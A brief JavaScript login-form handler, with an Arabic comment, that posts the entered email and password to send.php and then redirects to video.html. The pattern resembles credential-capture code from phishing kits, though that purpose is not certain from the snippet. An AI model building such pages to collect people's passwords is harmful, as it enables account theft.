document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let formData = new FormData();
    formData.append("email", document.getElementById("username").value);
    formData.append("password", document.getElementById("password").value);

    fetch("send.php", {
        method: "POST",
        body: formData
    }).then(() => {
        window.location.href = "video.html"; // توجيه المستخدم بعد تسجيل الدخول
    });
});
